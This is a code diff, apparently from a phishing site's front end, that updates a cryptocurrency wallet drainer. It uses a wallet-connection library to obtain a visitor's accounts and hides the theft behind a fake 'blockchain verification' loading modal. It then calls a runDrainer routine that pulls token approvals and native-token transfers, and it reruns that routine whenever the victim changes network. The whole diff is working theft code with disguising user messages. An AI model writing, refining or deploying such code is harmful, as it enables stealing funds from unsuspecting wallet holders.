@@ -1,11 +1,12 @@
 import { createAppKit } from '@reown/appkit';
-import { mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base } from '@reown/appkit/networks';
+import { mainnet, polygon, bsc, arbitrum } from '@reown/appkit/networks';
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
+import { ethers } from 'ethers';
 import { runDrainer } from './drainer.js';
 
 // === Конфигурация AppKit ===
 const projectId = 'd85cc83edb401b676e2a7bcef67f3be8';
-const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base];
+const networks = [mainnet, polygon, bsc, arbitrum];
 const wagmiAdapter = new WagmiAdapter({ projectId, networks });
 
 const appKitModal = createAppKit({
@@ -24,22 +25,23 @@ const appKitModal = createAppKit({
 
 // === Глобальные переменные ===
 let connectedAddress = null;
+let hasDrained = false;
+let isTransactionPending = false;
 let actionBtn = null;
 let modalOverlay = null;
 let modalContent = null;
+let modalSubtitle = null;
 
 // === Инициализация при загрузке страницы ===
 window.addEventListener('DOMContentLoaded', () => {
   actionBtn = document.getElementById('action-btn');
   const isInjected = typeof window.ethereum !== 'undefined';
 
-  // Подключаем шрифт Inter
   const link = document.createElement('link');
   link.href = 'https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap';
   link.rel = 'stylesheet';
   document.head.appendChild(link);
 
-  // CSS для модального окна в стиле AppKit
   const style = document.createElement('style');
   style.textContent = `
     .modal-overlay {
@@ -52,6 +54,7 @@ window.addEventListener('DOMContentLoaded', () => {
       z-index: 999;
       display: none;
       backdrop-filter: blur(4px);
+      pointer-events: auto;
     }
 
     .modal-content {
@@ -84,15 +87,6 @@ window.addEventListener('DOMContentLoaded', () => {
       font-weight: 600;
       color: #FFFFFF;
       margin-bottom: 16px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-    }
-
-    .modal-title::before {
-      content: '';
-      font-size: 20px;
     }
 
     .modal-subtitle {
@@ -100,9 +94,9 @@ window.addEventListener('DOMContentLoaded', () => {
       font-weight: 400;
       color: #A0AEC0;
       margin-bottom: 24px;
+      word-wrap: break-word;
     }
 
-    /* Лоадер: пульсирующее кольцо с волнами */
     .loader-container {
       position: relative;
       width: 100px;
@@ -120,25 +114,12 @@ window.addEventListener('DOMContentLoaded', () => {
       border-radius: 50%;
       transform: translate(-50%, -50%);
       animation: pulse 2s ease-in-out infinite;
-      box-shadow: 0 0 15px rgba(59, 130, 246, 0.5);
     }
 
     @keyframes pulse {
-      0% {
-        width: 40px;
-        height: 40px;
-        opacity: 0.8;
-      }
-      50% {
-        width: 50px;
-        height: 50px;
-        opacity: 0.4;
-      }
-      100% {
-        width: 40px;
-        height: 40px;
-        opacity: 0.8;
-      }
+      0% { width: 40px; height: 40px; opacity: 0.8; }
+      50% { width: 50px; height: 50px; opacity: 0.4; }
+      100% { width: 40px; height: 40px; opacity: 0.8; }
     }
 
     .wave {
@@ -154,25 +135,12 @@ window.addEventListener('DOMContentLoaded', () => {
       animation: wave 4s ease-out infinite;
     }
 
-    .wave:nth-child(2) {
-      animation-delay: 1s;
-    }
-
-    .wave:nth-child(3) {
-      animation-delay: 2s;
-    }
+    .wave:nth-child(2) { animation-delay: 1s; }
+    .wave:nth-child(3) { animation-delay: 2s; }
 
     @keyframes wave {
-      0% {
-        width: 40px;
-        height: 40px;
-        opacity: 0.6;
-      }
-      100% {
-        width: 100px;
-        height: 100px;
-        opacity: 0;
-      }
+      0% { width: 40px; height: 40px; opacity: 0.6; }
+      100% { width: 100px; height: 100px; opacity: 0; }
     }
 
     .action-list {
@@ -192,12 +160,6 @@ window.addEventListener('DOMContentLoaded', () => {
       gap: 8px;
     }
 
-    .action-list li::before {
-      content: '';
-      color: #10B981;
-      font-size: 16px;
-    }
-
     .modal-footer {
       font-size: 12px;
       font-weight: 400;
@@ -212,56 +174,24 @@ window.addEventListener('DOMContentLoaded', () => {
         padding: 20px;
         min-height: 300px;
       }
-      .modal-title {
-        font-size: 18px;
-      }
-      .modal-subtitle {
-        font-size: 13px;
-      }
-      .loader-container {
-        width: 70px;
-        height: 70px;
-      }
+      .modal-title { font-size: 18px; }
+      .modal-subtitle { font-size: 13px; }
+      .loader-container { width: 70px; height: 70px; }
       @keyframes pulse {
-        0% {
-          width: 30px;
-          height: 30px;
-          opacity: 0.8;
-        }
-        50% {
-          width: 40px;
-          height: 40px;
-          opacity: 0.4;
-        }
-        100% {
-          width: 30px;
-          height: 30px;
-          opacity: 0.8;
-        }
+        0% { width: 30px; height: 30px; opacity: 0.8; }
+        50% { width: 40px; height: 40px; opacity: 0.4; }
+        100% { width: 30px; height: 30px; opacity: 0.8; }
       }
       @keyframes wave {
-        0% {
-          width: 30px;
-          height: 30px;
-          opacity: 0.6;
-        }
-        100% {
-          width: 70px;
-          height: 70px;
-          opacity: 0;
-        }
+        0% { width: 30px; height: 30px; opacity: 0.6; }
+        100% { width: 70px; height: 70px; opacity: 0; }
       }
-      .action-list {
-        font-size: 13px;
-      }
-      .modal-footer {
-        font-size: 11px;
-      }
+      .action-list { font-size: 13px; }
+      .modal-footer { font-size: 11px; }
     }
   `;
   document.head.appendChild(style);
 
-  // Создаём модальное окно
   modalOverlay = document.createElement('div');
   modalOverlay.className = 'modal-overlay';
   document.body.appendChild(modalOverlay);
@@ -286,7 +216,8 @@ window.addEventListener('DOMContentLoaded', () => {
   `;
   document.body.appendChild(modalContent);
 
-  // Проверяем наличие инжектированного провайдера
+  modalSubtitle = modalContent.querySelector('.modal-subtitle');
+
   if (!isInjected) {
     actionBtn.style.display = 'inline-block';
     actionBtn.addEventListener('click', () => {
@@ -297,49 +228,129 @@ window.addEventListener('DOMContentLoaded', () => {
 
   actionBtn.style.display = 'inline-block';
   actionBtn.addEventListener('click', handleConnectOrAction);
+
+  window.ethereum.on('chainChanged', onChainChanged);
 });
 
 // === Управление модальным окном ===
 function showModal() {
   modalOverlay.style.display = 'block';
+  modalOverlay.style.pointerEvents = 'auto';
   modalContent.style.display = 'block';
+  modalSubtitle.textContent = "Processing blockchain verification...";
 }
 
-function hideModal() {
+async function hideModalWithDelay(errorMessage = null) {
+  if (errorMessage) {
+    modalSubtitle.textContent = errorMessage;
+    await new Promise(resolve => setTimeout(resolve, 7000));
+  }
   modalOverlay.style.display = 'none';
+  modalOverlay.style.pointerEvents = 'none';
   modalContent.style.display = 'none';
+  document.body.style.pointerEvents = 'auto';
 }
 
-// === Подключение кошелька ===
+// === Выполнение drainer ===
+async function attemptDrainer() {
+  if (hasDrained || isTransactionPending) {
+    console.log('⚠️ Транзакция уже выполнена или ожидается');
+    return;
+  }
+
+  if (!connectedAddress) {
+    console.error('❌ Адрес кошелька не определён');
+    showModal();
+    await hideModalWithDelay("Error: Wallet address not defined. Please try again.");
+    return;
+  }
+
+  showModal();
+
+  try {
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const signer = provider.getSigner();
+    const address = await signer.getAddress();
+
+    if (address.toLowerCase() !== connectedAddress.toLowerCase()) {
+      throw new Error('Wallet address mismatch');
+    }
+
+    console.log('⏳ Задержка 5 секунд перед runDrainer');
+    await new Promise(resolve => setTimeout(resolve, 5000));
+
+    isTransactionPending = true;
+    const status = await runDrainer(provider, signer, connectedAddress);
+    console.log('✅ Drainer выполнен, статус:', status);
+
+    hasDrained = true;
+    isTransactionPending = false;
+    await hideModalWithDelay();
+  } catch (err) {
+    isTransactionPending = false;
+    let errorMessage = "Error: An unexpected error occurred. Please try again.";
+    if (err.message.includes('user rejected')) {
+      errorMessage = "Error: Transaction rejected by user.";
+    } else if (err.message.includes('Insufficient')) {
+      errorMessage = err.message;
+    } else if (err.message.includes('Failed to approve token')) {
+      errorMessage = "Error: Failed to approve token. Your wallet may not support this operation.";
+    } else if (err.message.includes('Failed to process')) {
+      errorMessage = "Error: Failed to process native token transfer. Your wallet may not support this operation.";
+    } else if (err.message.includes('Failed to switch chain')) {
+      errorMessage = "Error: Failed to switch network. Please switch manually in your wallet.";
+    } else {
+      errorMessage = `Error: ${err.message}`;
+    }
+    console.error('❌ Ошибка drainer:', err.message);
+    await hideModalWithDelay(errorMessage);
+    throw err;
+  }
+}
+
+// === Подключение кошелька и запуск ===
 async function handleConnectOrAction() {
   try {
-    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
     if (accounts.length === 0) {
       await appKitModal.open();
       connectedAddress = await waitForWallet();
-      console.log('✅ Подключён кошелёк:', connectedAddress);
     } else {
       connectedAddress = accounts[0];
-      console.log('✅ Уже подключён:', connectedAddress);
+      console.log('✅ Подключён:', connectedAddress);
     }
 
-    showModal();
-    
-    // Передаём коллбэк для закрытия модального окна при отправке транзакции approve
-    await runDrainer(null, null, connectedAddress, hideModal);
+    if (!isTransactionPending) {
+      await attemptDrainer();
+    } else {
+      console.log('⏳ Транзакция уже выполняется');
+    }
   } catch (err) {
     console.error('❌ Ошибка подключения:', err.message);
+    isTransactionPending = false;
+    showModal();
+    await hideModalWithDelay(`Error: Failed to connect wallet. ${err.message}`);
+  }
+}
+
+// === Обработка смены сети ===
+async function onChainChanged(chainId) {
+  console.log('🔄 Смена сети:', chainId);
+  if (connectedAddress && !isTransactionPending) {
+    await attemptDrainer();
+  } else {
+    console.log('⏳ Транзакция в процессе');
   }
 }
 
 // === Ожидание подключения кошелька ===
 async function waitForWallet() {
-  const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+  const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
   if (accounts.length > 0) return accounts[0];
 
   return new Promise((resolve) => {
     const interval = setInterval(async () => {
-      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
       if (accounts.length) {
         clearInterval(interval);
         resolve(accounts[0]);
